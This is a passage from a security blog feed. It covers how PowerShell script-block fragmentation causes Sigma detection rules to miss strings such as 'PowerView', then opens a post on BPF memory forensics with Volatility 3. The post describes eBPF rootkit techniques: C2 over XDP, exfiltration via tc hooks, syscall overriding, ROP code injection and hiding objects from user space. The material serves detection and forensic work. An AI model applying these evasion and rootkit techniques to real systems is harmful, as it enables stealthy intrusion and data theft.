&lt;td>2&lt;/td>
&lt;td>2&lt;/td>
&lt;td>2&lt;/td>
&lt;td>2&lt;/td>
&lt;td>2&lt;/td>
&lt;td>2&lt;/td>
&lt;td>1.9&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>PowerView PowerShell Cmdlets - ScriptBlock&lt;/td>
&lt;td>27&lt;/td>
&lt;td>30&lt;/td>
&lt;td>32&lt;/td>
&lt;td>34&lt;/td>
&lt;td>35&lt;/td>
&lt;td>35&lt;/td>
&lt;td>36&lt;/td>
&lt;td>38&lt;/td>
&lt;td>40&lt;/td>
&lt;td>45&lt;/td>
&lt;td>35.2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Request A Single Ticket via PowerShell&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>&amp;lt;2&amp;gt; +1 because of script block cut-off&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1.1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Usage Of Web Request Commands And Cmdlets - ScriptBlock&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>First, let&amp;rsquo;s look at some results that were expected.&lt;/p>
&lt;p>[1] Potential Suspicious PowerShell Keywords: When having only 39 script block fragments, only 1 alarm is generated because all the &amp;ldquo;suspicious&amp;rdquo; strings fitted into the first block - because it is larger compared to the other cases.&lt;/p>
&lt;p>[2] Execute Invoke-command on Remote Host: Goes from 5 to 7 raised alerts - increasing with the number of blocks because the search strings are found in more blocks. Only run 6 with 57 blocks is an outlier, producing less alerts than run 3 with the &lt;em>same amount&lt;/em> of 57 blocks. This is getting suspicious..&lt;/p>
&lt;p>[3] Manipulation of User Computer or Group Security Principals Across AD: In all but two runs exactly 4 alarms are generated. The run that raised 5 alarms was the one with the largest number of blocks - so this behavior is expected - but the one with the most alarms (6) only created 54 blocks. Further investigation showed that this is the result of the &amp;ldquo;random&amp;rdquo; script fragmentation, where all 6 &amp;ldquo;suspicious&amp;rdquo; strings were found in 6 different blocks, where in the other runs multiple strings where found in a single block resulting in less alerts.&lt;/p>
&lt;p>Okay, so these results are kind of expected and not too bad. So we should be fine, right?&lt;/p>
&lt;p>Well, when investigating the results of the rule &lt;a href="https://github.com/SigmaHQ/sigma/blob/4319f5807ff4eb8035ecf1a8f86ab3bdc1ab8960/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml">Malicious PowerShell Commandlets - ScriptBlock&lt;/a>, a case came true that we thought was extremely unlikely.&lt;/p>
&lt;h2 id="the-case-of-split-powerview">The case of split &amp;ldquo;&lt;em>PowerVi/ew&lt;/em>&amp;rdquo;&lt;/h2>
&lt;p>Among others, the rule &lt;a href="https://github.com/SigmaHQ/sigma/blob/4319f5807ff4eb8035ecf1a8f86ab3bdc1ab8960/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml">Malicious PowerShell Commandlets - ScriptBlock&lt;/a>, detects the string &amp;ldquo;PowerView&amp;rdquo; inside script blocks. Now, comparing two different runs, run3 with 57 blocks generated 51 alerts and run2 with 76 blocks generated 61 alerts for this rule. So more blocks -&amp;gt; more alerts, this is fine. But, looking deeper into the script blocks and generated alerts, we noticed something at the end of script block 38 of 57 of run 3.&lt;/p>
&lt;pre tabindex="0">&lt;code>Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment\n
$LocalGroup.PSObject.TypeNames.Insert(0, 'PowerVi
&lt;/code>&lt;/pre>&lt;hr>
&lt;p>And the beginning of script block 39 of 57:&lt;/p>
&lt;pre tabindex="0">&lt;code>ew.LocalGroup.API')\n
&lt;/code>&lt;/pre>&lt;p>So, in this case the PowerView script was fragmented in such a way, that a string that should have been detected was no longer detected, i.e., &amp;ldquo;PowerView&amp;rdquo; was split into &amp;ldquo;PowerVi&amp;rdquo; and &amp;ldquo;ew&amp;rdquo;. (To be fair, script block 38 still raised an alarm because the string &amp;ldquo;PowerView&amp;rdquo; occures in it multiple times, but still this example illustrates the problem at hand.)&lt;/p>
&lt;h2 id="losing-alerts">Losing alerts&lt;/h2>
&lt;p>This shows, that depending on the fragmentation of script blocks, we can indeed lose alerts and miss contents of scripts that should be detected, e.g., by strings split into two parts in two different blocks. But there are other cases: Rules like &lt;a href="https://github.com/SigmaHQ/sigma/blob/49adcf9a00247ed6c3daacba03b589470f6716d0/rules/windows/powershell/powershell_script/posh_ps_invoke_command_remote.yml">Execute Invoke-command on Remote Host&lt;/a> detect multiple strings in a single script block (&lt;code>ScriptBlockText|contains|all&lt;/code>). Now, when one of those strings is randomly put into a different block, the rule no longer triggers. Although this case should be more likely than the case of &amp;ldquo;search strings split in two&amp;rdquo;, the 10 simulations did not result in such a case since the number of alerts for this specific rule is much smaller (only 5-7 alarms compared to 35-61 for &amp;ldquo;Malicious PowerShell Commandlets - ScriptBlock&amp;rdquo;).&lt;/p>
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>We learned that loading the PowerView script multiple times results in fragmentations of it ranging from 39 to 76 blocks. The alerts raised on these script blocks showed the trend of increasing number of alerts with increasing number of script blocks. Although this behavior adds uncertainty to the generation of alerts, it is of no critical nature. But, another example showed, that the fragmentation of scripts into blocks might result in suspicious/malicious strings being split into two blocks, resulting in a case where the search strings could not be found and the detection is completely missed. Furthermore, when searching for multiple strings in a single block, the fragmentation of scripts might result in these strings being split into two different blocks - where detection is also no longer possible.&lt;/p>
&lt;p>&lt;strong>Is there a remedy?&lt;/strong> Maybe re-combining script fragments (&lt;a href="https://news.sophos.com/en-us/2022/03/29/reconstructing-powershell-scripts-from-multiple-windows-event-logs/">like this&lt;/a>) to run detection mechanisms on the reconstructed scripts?&lt;/p>
&lt;p>&lt;strong>Sidenote:&lt;/strong> To add, this behavior might also be leveraged by malicious actors to avoid detection&amp;hellip;&lt;/p>
&lt;p>The described findings were observed on a Windows 10 host with PowerShell Version 5.1 and PowerShell logging configurations according to the &lt;a href="https://www.cyber.gov.au/sites/default/files/2023-03/PROTECT%20-%20Windows%20Event%20Logging%20and%20Forwarding%20(October%202021).pdf">recommendations by the Australian Cyber Security Centre (ACSC)&lt;/a> which include PowerShell Module and PowerShell Script Block Logging.&lt;/p></content></item><item><title>BPF Memory Forensics with Volatility 3</title><link>https://lolcads.github.io/posts/2023/12/bpf_memory_forensics_with_volatility3/</link><pubDate>Thu, 21 Dec 2023 13:47:46 +0100</pubDate><guid>https://lolcads.github.io/posts/2023/12/bpf_memory_forensics_with_volatility3/</guid><description>BPF Memory Forensics with Volatility 3 Introduction and Motivation Have you ever wondered how an eBPF rootkit looks like? Well, here&amp;rsquo;s one, have a good look:
Upon receiving a command and control (C2) request, this specimen can execute arbitrary commands on the infected machine, exfiltrate sensitive files, perform passive and active network discovery scans (like nmap), or provide a privilege escalation backdoor to a local shell. Of course, it&amp;rsquo;s also trying its best to hide itself from system administrators hunting it with different command line tools such as ps, lsof, tcpdump an others or even try tools like rkhunter or chkrootkit.</description><content>&lt;h1 id="bpf-memory-forensics-with-volatility-3">BPF Memory Forensics with Volatility 3&lt;/h1>
&lt;h2 id="introduction-and-motivation">Introduction and Motivation&lt;/h2>
&lt;p>Have you ever wondered how an eBPF rootkit looks like? Well, here&amp;rsquo;s one, have a good look:&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2023/12/ubuntu-20.04-LTS-focal-ebpfkit.png" alt="ubuntu-20.04-LTS-focal-ebpfkit.png">&lt;/p>
&lt;p>Upon receiving a command and control (C2) request, this specimen can execute arbitrary commands on the infected machine, exfiltrate sensitive files, perform passive and active network discovery scans (like &lt;code>nmap&lt;/code>), or provide a privilege escalation backdoor to a local shell. Of course, it&amp;rsquo;s also trying its best to hide itself from system administrators hunting it with different command line tools such as &lt;code>ps&lt;/code>, &lt;code>lsof&lt;/code>, &lt;code>tcpdump&lt;/code> an others or even try tools like &lt;code>rkhunter&lt;/code> or &lt;code>chkrootkit&lt;/code>.&lt;/p>
&lt;p>Well, you say, rootkits have been doing that for more than 20 years now, so what&amp;rsquo;s the news here? The news aren&amp;rsquo;t that much the features, but rather how they are implemented. Everything is realized using a relatively new and rapidly evolving kernel feature: eBPF. Even though it has been in the kernel for almost 10 years now, we&amp;rsquo;re regularly surprised by how many experienced Linux professionals are still unaware of its existence, not even to mention its potential for abuse.&lt;/p>
&lt;p>The above picture was generated from the memory image of a system infected with &lt;a href="https://github.com/Gui774ume/ebpfkit">&lt;code>ebpfkit&lt;/code>&lt;/a>, an open-source PoC rootkit from 2021, using a plugin for the &lt;a href="https://github.com/volatilityfoundation/volatility3">Volatility 3&lt;/a> memory forensics framework. In this blog post, we will present a total of seven plugins that, taken together, facilitate an in depth analysis of the state of the BPF subsystem.&lt;/p>
&lt;p>We structured this post as follows: The next section provides an introduction to the BPF subsystem, while the third section highlights its potential for (ab)use by malware. In section four, we will introduce seven Volatility 3 plugins that facilitate the examination of BPF malware. Section five presents a case study, followed by a section describing our testing and evaluation of the plugins on various Linux distributions.
In the last section, we conclude with a discussion of the steps that are necessary to integrate our work into the upstream Volatility project, other challenges we encountered, and open research questions.&lt;/p>
&lt;p>&lt;em>Note: The words &amp;ldquo;eBPF&amp;rdquo; and &amp;ldquo;BPF&amp;rdquo; will be used interchangeably throughout this post.&lt;/em>&lt;/p>
&lt;h2 id="the-bpf-subsystem">The BPF Subsystem&lt;/h2>
&lt;p>Before delving into the complexities of memory forensics, it is necessary to establish some basics about the BPF subsystem. Readers that are already familiar with the topic can safely skip this section.&lt;/p>
&lt;p>To us, BPF is first of all an &lt;strong>instruction set architecture (ISA)&lt;/strong>. It has ten general purpose registers, which are 64 bit wide, and there are all of the basic operations that you would expect a modern ISA to have. Its creator, Alexei Starovoitov, once described it as a kind of simplified x86-64 and would probably never have imagined that the ISA he cooked up back in 2014 would once enter a standardization process at the IETF. The interested reader can find the current proposed standard &lt;a href="https://datatracker.ietf.org/doc/draft-ietf-bpf-isa/">here&lt;/a>. Of course, there are all the other things that you would expect to come with an ISA, like an ABI that defines the calling convention, and a binary encoding that maps instructions to sequences of four or eight bytes.&lt;/p>
&lt;p>The BPF ISA is used as a compilation target (currently by clang - gcc support is on the way) for programs written in high-level languages (currently C and Rust), however, it is not meant to be implemented in hardware. Therefore, it is conceptually more similar to WebAssembly or Java Bytecode than x86-64 or arm64, i.e., BPF programs are meant to be executed by a &lt;strong>runtime&lt;/strong> that implements the BPF virtual machine (VM). Several BPF runtimes exist, but the &amp;ldquo;reference implementation” is in the Linux kernel.&lt;/p>
&lt;p>Runtimes are, of course, free to choose how they implement the BPF VM. The instruction set was defined in a way that makes it easy to implement a one-to-one just in time (JIT) compiler for many CPU architectures. In fact, in the Linux kernel, even non-mainstream architectures like powerpc, sparc or s390 have BPF JITs. However, the kernel also has an &lt;a href="https://elixir.bootlin.com/linux/v6.1.68/source/kernel/bpf/core.c#L1648">interpreter&lt;/a> to run BPF programs on architectures that do not yet support JIT compilation.&lt;/p>
&lt;p>Aside: &lt;em>The BPF platform is what some call a &amp;ldquo;&lt;strong>verified&lt;/strong> target&amp;rdquo;. This means that in order for a program to be valid it has to have some &amp;ldquo;non-local&amp;rdquo; properties. Those include the absence of (unbounded) loops, registers and memory can only be read after they have been written to, the stack depth may not exceed a hard limit, and many more. The interested reader can find a more exhaustive description &lt;a href="https://www.kernel.org/doc/html/latest/bpf/verifier.html">here&lt;/a>. In practice, runtime implementations include an up-front static verification stage and refuse to execute programs that cannot be proven to meet these requirements (some runtime checks may be inserted to account for the known shortcomings of static analysis). This static verification approach is at the hearth of BPF&amp;rsquo;s sandboxing model for untrusted code.&lt;/em>&lt;/p>
&lt;p>Roughly speaking, the BPF subsystem includes, besides the implementation of the BPF VM, a user and kernel space interface for managing the program life cycle as well as infrastructure for transitioning the kernel control flow in and out of programs running inside the VM. Other subsystems can be made &amp;ldquo;programmable&amp;rdquo; by integrating the BPF VM in places where they want to allow the calling of user-defined functions, e.g., for decision making based on their return value. The networking subsystem, for example, supports handing all incoming and outgoing packets on an interface to a BPF program. Those programs can freely rewrite the packet buffer or even decide to drop the packet all together. Another example is the tracing subsystem that supports transitioning control into BPF programs at essentially any instruction via one of the various ways it has to hook into the kernel and user space execution. The final example here is the Linux Security Module (LSM) subsystem that supports calling out to BPF programs at any of its security hooks placed at handpicked choke points in the kernel. There are many more examples of BPF usage in the kernel and even more in &lt;a href="https://dl.acm.org/doi/proceedings/10.1145/3609021">academic research papers&lt;/a> and patches on the mailing list, but we guess we conveyed the general idea.&lt;/p>
&lt;p>BPF programs can interact with the world outside of the VM via so called &lt;strong>helpers&lt;/strong> or &lt;strong>kfuncs&lt;/strong>, i.e., native kernel functions that can be called by BPF programs. Services provided by these functions range from getting a timestamp to sending a signal to the current task or reading arbitrary memory. Which functions a program can call depends on the &lt;em>program type&lt;/em> that was selected when loading it into the VM. When reversing BPF programs, looking for calls to interesting kernel functions is a good point to start.&lt;/p>
&lt;p>The second ingredient you need in order to get any real work done with a BPF program are &lt;strong>maps&lt;/strong>. While programs can store data during their execution using stack memory or by allocating objects on the heap, the only way to persist data across executions of the same program are maps. Maps are mutable persistent key value stores that can be accessed by BPF programs and user space alike, as such they can be used for user-to-BPF, BPF-to-user, or BPF-to-BPF communication, where in the last case the communicating programs may be different or the same program at different times.&lt;/p>
&lt;p>Another relevant aspect of the BPF ecosystem is the promise of &lt;strong>compile once run everywhere (CORE)&lt;/strong>, i.e., a (compiled) BPF program can be run inside of a wide range of Linux kernels that might have different configurations, versions, compilers, and even CPU architectures. This is achieved by having the compiler emit special relocation entries that are processed by a user-space loader prior to loading a program into the kernel&amp;rsquo;s BPF VM. The key ingredient that enables this approach is a self-description of the running kernel in the form of BPF Type Format (BTF) information, which is made available in special files under &lt;code>/sys/kernel/btf/&lt;/code>. For example, BPF source code might do something like &lt;code>current-&amp;gt;comm&lt;/code> to access the name of the process in whose context the program is running. This might generate an assembly instruction that adds the offset of the &lt;code>comm&lt;/code> field to a pointer to the task descriptor that is stored in a register, i.e., &lt;code>ADD R5, IMM&lt;/code>. However, the immediate offset might vary due to kernel version, configuration, structure layout randomization or CPU architecture. Thus, the compiler would emit a relocation entry that tells the user-space loader running on the target system to check the kernel&amp;rsquo;s BTF information in order to overwrite the placeholder with the correct offset. Together with other kinds of relocations, which address things like existence of types and enum variants or their sizes, the loader be used to run the same BPF program on a considerable number of kernels.&lt;/p>
&lt;p>Aside: &lt;em>A problem with the CORE implementation described above is that signatures over BPF programs are meaningless as the program text will be altered by relocations before loading. To allow for a meaningful ahead of time signature there is another approach in which a loader program is generated for the actual program. The loader program is portable without relocations and is signed and loaded together with the un-relocated bytecode of the actual program. Thus, the problem is solved as all text relocations happen in the kernel, i.e., after signatures have been verified.&lt;/em>&lt;/p>
&lt;p>However, there are of course limits to the portability of BPF programs. As we all know, the kernel takes great care to never break user space, within kernel land, on the other hand, there are no stability guarantees at all. BPF programs are not considered to be part of user space and thus there are no forward or backward compatibility guarantees. In practice, that means that APIs exposed to BPF could be removed or changed, attachment points could vanish or change their signature, or programs that are currently accepted by the static verifier could be rejected in the future. Furthermore, changes in kernel configuration could remove structure fields, functions, or kernel APIs that programs rely on. In that sense, BPF programs are in a position similar to out-of-tree kernel modules. That being said, due to CORE, there is no need to have the headers of the target kernel available at compile time and thus a lot less knowledge about the target is needed to be confident that the program will be able to run successfully. Furthermore, in the worst case the program will be rejected by the kernel, but there are no negative implications on system stability by attempting to load it.&lt;/p>
&lt;p>Finally, we should mention that BPF is an entirely privileged interface. There are multiple BPF-related &lt;a href="https://elixir.bootlin.com/linux/v6.1.68/source/include/uapi/linux/capability.h#L411">capabilities&lt;/a> that a process can have, which open up various parts of the subsystem. This has not always been the case. A few years ago, unprivileged users were able to load certain types of BPF programs, however, access to the BPF VM comes with two potential security problems. First, the security entirely relies on the correctness of the static verification stage, which is notoriously complex and must keep up with the ever-expanding feature set. It has been demonstrated that errors in the verification process can be exploited for local privilege escalation, e.g., &lt;a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">CVE-2020-8835&lt;/a> or &lt;a href="https://chompie.rip/Blog+Posts/Kernel+Pwning+with+eBPF+-+a+Love+Story">CVE-2021-3490&lt;/a>. Second, even within the boundaries set by the verifier, the far-reaching control over the CPU instructions that get executed in kernel mode opens up the door for Spectre attacks, c.f., &lt;a href="https://github.com/hamishcoleman/spectre-tests/blob/master/project-zero/writeup_files/WRITEUP#L282">Jann Horn&amp;rsquo;s writeup&lt;/a> or the original &lt;a href="https://spectreattack.com/spectre.pdf">Spectre paper&lt;/a>. For those reasons, the kernel community has decided to remove unprivileged access to BPF &lt;a href="https://elixir.bootlin.com/linux/v6.1.68/source/kernel/bpf/Kconfig#L71">by default&lt;/a>.&lt;/p>
&lt;h2 id="bpf-malware">BPF Malware&lt;/h2>
&lt;p>To better understand the implications the addition of the BPF VM has for the Linux malware landscape, we would like to start with a quote from &amp;ldquo;BPF inventor&amp;rdquo; Alexei Starovoitov: &amp;ldquo;If in the past the whole kernel would maybe be [a] hundred of programmers across the world, now a hundred thousand people around the world can program the kernel thanks to BPF.&amp;rdquo;, i.e., BPF significantly lowers the entry barrier to kernel programming and shipping applications that include kernel-level code. While the majority of new kernel programmers are well-intentioned and aim to develop innovative and useful applications, experience has shown that there will be some actors who seek to use new kernel features for malicious purposes.&lt;/p>
&lt;p>From a malware author&amp;rsquo;s perspective, one of the first questions is probably how likely it is that a target system will support the loading of malicious BPF programs. According to our personal experience it is safe to say that most general-purpose desktop and server distributions enable BPF. The feature is also enabled in the &lt;code>android-base.config&lt;/code> as BPF plays a significant role in the Android OS, i.e., essentially every Android device should support BPF - from your fridge to your phone. Concerning the custom kernels used by big tech companies let me quote Brendan Gregg, another early BPF advocate: &amp;ldquo;As companies use more and more eBPF also, it becomes harder for your operating system to not have eBPF because you are no longer eligible to run workloads at Netflix or at Meta or at other companies.&amp;rdquo;. What is more, Google relies on BPF (through &lt;a href="https://github.com/cilium/cilium">&lt;code>cilium&lt;/code>&lt;/a>) in its Kubernetes engine and Facebook uses it for its layer 4 load balancer &lt;a href="https://github.com/facebookincubator/katran">&lt;code>katran&lt;/code>&lt;/a>. For a more comprehensive survey of BPF usage in cloud environments we recommend section 5 of &lt;a href="https://www.usenix.org/conference/usenixsecurity23/presentation/he">&lt;em>Cross Container Attacks: The Bewildered eBPF on Clouds&lt;/em>&lt;/a> by Yi He et al. Thus, most of the machines that constitute &amp;ldquo;the cloud&amp;rdquo; are likely to support BPF. This is particularly interesting as signature verification for BPF programs is still not available, making it the only way to run kernel code on locked-down systems that restrict the use of kernel modules.&lt;/p>
&lt;p>However, enabling the BPF subsystem, i.e., &lt;code>CONFIG_BPF&lt;/code>, is only the beginning of the story. There are many compile-time or run-time configuration choices that affect the capabilities granted to BPF programs, and thus the ways in which they can be used to subvert the security of a system. Giving a full overview of all the available switches and their effect would exceed the scope of this post, however, we will mention some knobs that can be turned to stop the abuses mentioned below.&lt;/p>
&lt;p>If you search for the term “BPF malware” these days, you will find rather sensational articles with titles like &amp;ldquo;eBPF: A new frontier for malware&amp;rdquo;, &amp;ldquo;How BPF-Enabled Malware Works&amp;rdquo;, &amp;ldquo;eBPF Offensive Capabilities – Get Ready for Next-gen Malware&amp;rdquo;, &amp;ldquo;Nothing is Safe Anymore - Beware of the “eBPF Trojan Horse” or &amp;ldquo;HOW DOES EBPF MALWARE PERFORM AGAINST STAR LAB’S KEVLAR EMBEDDED SECURITY?&amp;rdquo;. Needless to say, that they contain hardly any useful information. The truth is that we are not aware of any reports of in-the-wild malware using BPF. Nevertheless, there is no shortage in open source PoC BPF malwares on GitHub. The two biggest ones are probably &lt;a href="https://github.com/Gui774ume/ebpfkit">ebpfkit&lt;/a> and &lt;a href="https://github.com/h3xduck/TripleCross">TripeCross&lt;/a>, however, there are many smaller projects like &lt;a href="https://github.com/eeriedusk/nysm">nysm&lt;/a>, &lt;a href="https://github.com/Esonhugh/sshd_backdoor">sshd_backdoor&lt;/a>, &lt;a href="https://github.com/krisnova/boopkit">boopkit&lt;/a>, &lt;a href="https://github.com/citronneur/pamspy">pamspy&lt;/a>, or &lt;a href="https://github.com/pathtofile/bad-bpf">bad bpf&lt;/a> as well as snippet collections like &lt;a href="https://github.com/nccgroup/ebpf">nccgroup&amp;rsquo;s bpf tools&lt;/a>, &lt;a href="https://github.com/wunderwuzzi23/Offensive-BPF">Offensive-BPF&lt;/a>. Researchers also used malicious BPF programs to &lt;a href="https://www.usenix.org/conference/usenixsecurity23/presentation/he">escape container isolation&lt;/a> in multiple real-world cloud environments.&lt;/p>
&lt;p>There are a couple of core shenanigans that those malwares are constructed around, three of which we will briefly describe here.&lt;/p>
&lt;p>It is possible to transparently (for user space) skip the execution of any system call or to manipulate just the return value after it was executed. This is since BPF can be used for the purpose of &lt;a href="https://lwn.net/Articles/740146/">error injection&lt;/a>. To be precise, any function that is annotated with the &lt;code>ALLOW_ERROR_INJECTION&lt;/code> macro can be manipulated in this way, and every system call is &lt;a href="https://elixir.bootlin.com/linux/v6.1.64/source/arch/x86/include/asm/syscall_wrapper.h#L74">automatically annotated&lt;/a> via the macro that defines it. One would hope that the corresponding configurations &lt;a href="https://elixir.bootlin.com/linux/v6.1.64/source/kernel/trace/Kconfig#L711">&lt;code>BPF_KPROBE_OVERRIDE&lt;/code>&lt;/a> and &lt;a href="https://elixir.bootlin.com/linux/v6.1.67/source/lib/Kconfig.debug#L1880">&lt;code>CONFIG_FUNCTION_ERROR_INJECTION&lt;/code>&lt;/a> would not be enabled in kernels shipped to end users, but they are. There are many things that one can do by lying to user space in this way, one example would be to block the sending of all signals to a specific process, e.g., to protect it from being &lt;a href="https://github.com/Gui774ume/ebpfkit/blob/5727985eab7eca7255ca5cb7c74133c0074e3324/ebpf/ebpfkit/signal.h#L18">killed&lt;/a>. Interestingly, the same helper is also used by BPF-based security solutions like &lt;a href="https://github.com/cilium/tetragon/blob/d8f5d44810ad2079ee408175454aab5c1159f09e/docs/content/en/docs/concepts/tracing-policy/selectors.md?plain=1#L1030">tetragon&lt;/a>, which are deployed in production cloud environments.&lt;/p>
&lt;p>Another common primitive is to write to memory of the current process, which gives attackers the power to perform all sorts of interesting memory corruptions. One of the more original ideas is to &lt;a href="https://github.com/nccgroup/ebpf/tree/master/glibcpwn">inject code&lt;/a> into a process by writing a ROP chain onto its stack. The chain sets up everything to load a shared library and cleanly resumes the process afterwards. More generally, the helper &lt;code>bpf_probe_write_user&lt;/code> is involved in many techniques to hide objects, e.g., sockets or BPF programs, from user space or when manipulating apparent file and directory contents, e.g., &lt;code>/proc&lt;/code>, &lt;code>/etc/sudoers&lt;/code> or &lt;code>~/.ssh/authorized_keys&lt;/code>. In particular, those apparent modifications cannot be caught with file system forensics as they are only happening in the memory of the process that attempts to access the resource, e.g., see &lt;a href="https://github.com/pathtofile/bad-bpf/blob/main/src/textreplace.bpf.c">&lt;code>textreplace&lt;/code>&lt;/a> for an example that allows arbitrary apparent modifications of file contents. While there are in fact a couple of legitimate programs (like the &lt;a href="https://github.com/DataDog/datadog-agent/blob/f425dfa882dd9ca8533172c246ea047be1a40799/pkg/security/ebpf/probes/all.go#L257">Datadog-agent&lt;/a>) using this function, it is probably wise to enable &lt;a href="https://elixir.bootlin.com/linux/v6.1.67/source/security/lockdown/Kconfig#L33">&lt;code>CONFIG_LOCK_DOWN_KERNEL_FORCE_INTEGRITY&lt;/code>&lt;/a> before compilation.&lt;/p>
&lt;p>A rather peculiar aspect of BPF malware is how it communicates over the network. BPF programs are not able to initiate network connections by themselves, but as one of the main applications of BPF is in the networking subsystem, they have far-reaching capabilities when it comes to managing existing traffic. For example, XDP programs get their hands on packets very early in the receive path, long before mechanisms like netfilter, which is much further up the network stack, get a chance to see them. In fact, there are high-end NICs that support &lt;a href="https://www.netronome.com/blog/ever-deeper-bpf-update-hardware-offload-support/">running BPF programs on the device&amp;rsquo;s proces&lt;/a> rather than the host CPU. Furthermore, programs that handle packets can usually modify, reroute, or drop them. In combination, this is often used to receive C2 commands while at the same time hiding the corresponding packets from the rest of the kernel by modifying or dropping them. In addition, BPF&amp;rsquo;s easy programmability makes it simple to implement complex, stateful triggers. To exfiltrate data from the system, the contents, and potentially also the recipient data, of outgoing packets are modified, for example by traffic control (tc) hooks. For unreliable transport protocols higher layers will deal with the induced packet loss, while for TCP the retransmission mechanism ensures that applications will not be impacted. Turn off &lt;a href="https://www.kernelconfig.io/CONFIG_NET_CLS_BPF?q=NET_CLS_BPF&amp;amp;kernelversion=6.6.6&amp;amp;arch=x86">&lt;code>CONFIG_NET_CLS_BPF&lt;/code>&lt;/a> and &lt;a href="https://www.kernelconfig.io/CONFIG_NET_ACT_BPF?q=CONFIG_NET_ACT_BPF&amp;amp;kernelversion=6.6.6&amp;amp;arch=x86">&lt;code>CONFIG_NET_ACT_BPF&lt;/code>&lt;/a> to disable tc BPF programs.&lt;/p>
&lt;p>While the currently charted BPF malware landscape is limited to hobby projects by security researchers and other interested individuals, it would unfortunately not be unheard of that the same projects are eventually discovered during real-world incidents. Advanced Linux malwares, on the other hand, will most likely choose to implement their own BPF programs when they believe that it is beneficial for their cause, for instance to avoid detection by using a mechanism that is not yet well known to the forensic community. Some excerpts from the recent &lt;a href="https://www.youtube.com/watch?v=0BDB53PqcoU">talk by Kris Nova at DevOpsDays Kyiv&lt;/a> give an interesting insight into the concerns that the Ukrainian computer security community had, and still has, regarding the use of BPF in Russian attacks on their systems.&lt;/p>
&lt;p>It would be dishonest to claim that there is a general schema that you can follow while analyzing an incident to discover all malicious BPF programs. As so often, the boundaries between monitoring software, live patches, security solutions and malware are not clearly defined, e.g., in addition to &lt;code>bpf_override_retun&lt;/code> &lt;a href="https://github.com/cilium/tetragon">tetragon&lt;/a> also uses &lt;code>bpf_send_singal&lt;/code>. The first step could be to obtain a baseline of expected BPF-related activity, and carefully analyze any deviations or anomalies. Additionally, a look at the kernel configuration can help to decide which kinds of malicious activity are fundamentally possible. Furthermore, programs that make use of possibly malicious helper functions, like &lt;code>bpf_probe_wite_user&lt;/code>, &lt;code>bpf_send_signal&lt;/code>, &lt;code>bpf_override_return&lt;/code>, or &lt;code>bpf_skb_store_bytes&lt;/code> should be &lt;a href="https://blogs.blackberry.com/en/2021/12/reverse-engineering-ebpfkit-rootkit-with-blackberrys-free-ida-processor-tool">reverse engineered&lt;/a> with particular scrutiny. In addition, there are some clear indicators of malicious activity, like the hiding of programs, which we will discuss in more detail below. Finally, once program signatures are upstreamed, it is highly recommended to enable and enforce them to lock down this attack surface.&lt;/p>
&lt;p>From now on, we will shift gears and focus on the main topic of this post, hunting BPF malware in main memory images.&lt;/p>
&lt;p>&lt;em>Aside: The &lt;a href="https://www.pangulab.cn/en/post/the_bvp47_a_top-tier_backdoor_of_us_nsa_equation_group/">bvp47&lt;/a>, &lt;a href="https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat">Symbiote&lt;/a> and &lt;a href="https://sandflysecurity.com/blog/bpfdoor-an-evasive-linux-backdoor-technical-analysis/">BPFdoor&lt;/a> rootkits are often said to be examples of BPF malware. However, they are using only what is now known as classic BPF, i.e., the old-school packet filtering programs used by programs like tcpdump.&lt;/em>&lt;/p>
&lt;h2 id="volatility-plugins">Volatility Plugins&lt;/h2>
&lt;p>Volatility is a &lt;strong>memory forensics framework&lt;/strong> that can be used to analyze physical memory images. It uses information about symbols and types of the operating system that was running on the imaged system to recover high-level information, like the list of running processes or open files, from the raw memory image.&lt;/p>
&lt;p>Individual analyses are implemented as &lt;strong>plugins&lt;/strong> that make use of the framework library as well as other plugins. Some of those plugins are closely modeled after core unix utilities, like the &lt;code>ps&lt;/code> utility for listing processes, the &lt;code>ss&lt;/code> utility for listing network connections or the &lt;code>lsmod&lt;/code> utility for listing kernel modules. Other plugins implement checks that search for common traces of kernel rootkit activity, like the replacement of function pointers or inline hooks.&lt;/p>
&lt;p>There may be multiple ways to obtain the same piece of information, and thus multiple plugins that, on first sight, serve the same purpose. &lt;strong>Inconsistencies&lt;/strong> between the methods, however, could indicate malicious activity that tries to hide its presence or just be artifacts of imperfections in the acquisition process. In any case, inconsistencies are something an investigator should look into.&lt;/p>
&lt;p>In this section we present seven Volatility plugins that we have developed to enable analysis of the BPF subsystem. Three of these are modelled after subcommands of the &lt;a href="https://github.com/libbpf/bpftool">&lt;code>bpftool&lt;/code>&lt;/a> utility and provide basic functionality. We then present three plugins that retrieve similar information from other sources and can thus be used to detect inconsistencies. Finally, we present a plugin that aggregates information from four other plugins to make it easier to interpret.&lt;/p>
&lt;p>_Note: We published the source code for all of our plugins on &lt;a href="https://github.com/vobst/BPFVol3">GitHub&lt;/a>. We would love to see your contributions there! :)&lt;/p>
&lt;h3 id="listing-programs-maps--links">Listing Programs, Maps &amp;amp; Links&lt;/h3>
&lt;p>Arguably the most basic task that you could think of is simply listing the programs that have been loaded into the BPF VM. We will start by doing this on a live system, feel free to follow along in order to discover what your distribution or additional packages that you installed have already loaded.&lt;/p>
&lt;h4 id="live-system">Live System&lt;/h4>
